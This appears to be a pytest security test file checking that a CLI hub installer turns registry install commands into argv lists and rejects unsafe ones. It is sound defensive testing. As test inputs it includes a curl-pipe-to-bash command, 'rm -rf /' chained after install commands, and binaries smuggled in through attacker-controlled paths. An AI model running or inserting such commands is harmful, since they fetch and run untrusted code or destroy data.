"""Security tests for commands originating in the remote CLI registry."""

import sys
from unittest.mock import patch

import pytest

from cli_hub._command_policy import RegistryCommandRejected, registry_command_argv
from cli_hub.installer import _run_command


def cli(manager, command):
    return {"package_manager": manager, "install_cmd": command}


def test_brew_install_is_converted_to_argv():
    entry = cli("brew", "brew install --cask 1password-cli")
    assert registry_command_argv(entry, "install") == [
        "brew", "install", "--cask", "1password-cli"
    ]


def test_pip_install_uses_current_interpreter():
    entry = cli("pip", "python3 -m pip install git+https://github.com/example/tool.git")
    assert registry_command_argv(entry, "install") == [
        sys.executable, "-m", "pip", "install", "git+https://github.com/example/tool.git"
    ]


def test_uv_install_is_converted_to_argv():
    entry = cli("uv", "uv tool install git+https://github.com/example/tool.git")
    assert registry_command_argv(entry, "install", uv_executable="/usr/bin/uv") == [
        "/usr/bin/uv", "tool", "install", "git+https://github.com/example/tool.git"
    ]


@pytest.mark.parametrize("smuggled_uv", ["./uv", "/attacker/dir/uv", "../../bin/uv"])
def test_uv_install_rejects_path_smuggled_binary(smuggled_uv):
    """CLI-Anything-1 P1: a basename-only check let a registry entry point
    parts[0] at an arbitrary path and still pass as "uv"."""
    entry = cli("uv", f"{smuggled_uv} tool install git+https://github.com/example/tool.git")
    with pytest.raises(RegistryCommandRejected):
        registry_command_argv(entry, "install", uv_executable="/usr/bin/uv")


def test_uv_manager_override_used_when_package_manager_unset():
    """CLI-Anything-1 P2: the uv install/uninstall/update handlers already know
    they're on the uv strategy (they only run when install_strategy == "uv"),
    so they pass manager="uv" explicitly instead of requiring a registry entry
    to also repeat package_manager="uv"."""
    entry = {"install_strategy": "uv", "install_cmd": "uv tool install pkg"}
    assert registry_command_argv(entry, "install", manager="uv", uv_executable="/usr/bin/uv") == [
        "/usr/bin/uv", "tool", "install", "pkg"
    ]


def test_untrusted_install_strategy_value_is_not_treated_as_manager():
    """Regression guard: registry_command_argv must never infer a manager from
    install_strategy on its own. Doing so previously let install_strategy="brew"
    (with no package_manager) reach _brew_argv's basename-only check and run an
    attacker-controlled path, e.g. "/attacker/dir/brew install payload"."""
    entry = {"install_strategy": "brew", "install_cmd": "/attacker/dir/brew install payload"}
    with pytest.raises(RegistryCommandRejected):
        registry_command_argv(entry, "install")


@pytest.mark.parametrize(
    ("manager", "command"),
    [
        ("script", "curl -s https://example.test/install | bash"),
        ("brew", "brew install ok && rm -rf /"),
        ("brew", "python3 -c 'print(1)'"),
        ("pip", "python3 -m pip install --target /tmp tool"),
        ("uv", "python3 -c 'print(123)'"),
        ("uv", "uv tool install pkg && rm -rf /"),
        (None, "python3 -c 'print(123)'"),
        ("unknown", "echo hello"),
    ],
)
def test_untrusted_command_shapes_are_rejected(manager, command):
    # Fix the uv executable so these assertions don't depend on whether uv is
    # actually installed on the machine running the tests.
    kwargs = {"uv_executable": "/usr/bin/uv"} if manager == "uv" else {}
    with pytest.raises(RegistryCommandRejected):
        registry_command_argv(cli(manager, command), "install", **kwargs)


def test_runner_never_invokes_a_shell_for_operator_commands():
    with patch("cli_hub.installer.subprocess.run") as run:
        result = _run_command("curl -s https://example.test/install | bash")
    run.assert_not_called()
    assert result.returncode == 126


def test_runner_passes_plain_commands_as_argv():
    with patch("cli_hub.installer.subprocess.run") as run:
        _run_command("brew install tool")
    run.assert_called_once()
    assert run.call_args.args[0] == ["brew", "install", "tool"]
    assert "shell" not in run.call_args.kwargs
